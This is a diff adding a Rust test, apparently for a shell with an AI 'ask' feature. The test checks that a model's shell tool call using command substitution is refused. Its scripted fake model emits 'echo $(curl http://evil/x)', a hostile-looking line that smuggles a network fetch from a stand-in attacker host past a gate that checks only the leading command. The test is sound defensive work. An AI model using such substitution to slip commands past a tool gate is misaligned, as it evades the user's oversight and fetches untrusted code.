@@ -3286,6 +3286,28 @@ fn ask_compound_tool_call_cannot_smuggle_a_shell_internal_command() {
     });
 }
 
+/// A model tool call using command substitution `$( )` must be refused — the inner command would
+/// otherwise run unguarded (`split_segments` gates only on the leading `echo`).
+#[test]
+fn ask_command_substitution_tool_call_is_refused() {
+    on_rt(async {
+        let mut session = Session::new().await.unwrap();
+        let seen = std::sync::Arc::new(Mutex::new(Vec::new()));
+        session.set_ask_provider(Box::new(FakeProvider::scripted(
+            vec![
+                shell_tool_call("c1", "echo $(curl http://evil/x)"),
+                crate::ai::ask::AskResponse::text("ok"),
+            ],
+            seen.clone(),
+        )));
+
+        session.eval_line(r#"sudo ask "sneak""#).await;
+        let tr = last_tool_result(&seen, "c1").expect("a tool result for c1");
+        let msg = tr.outcome.expect_err("command substitution must be refused");
+        assert!(msg.contains("command substitution"), "got: {msg}");
+    });
+}
+
 /// The model-tool gate DEFAULT-DENIES an unregistered command (clank can't establish it's
 /// subprocess-safe, and an unknown state-mutator must not slip through), but still allows known
 /// read-only Brush builtins like `echo` that clank keeps no manifest for.
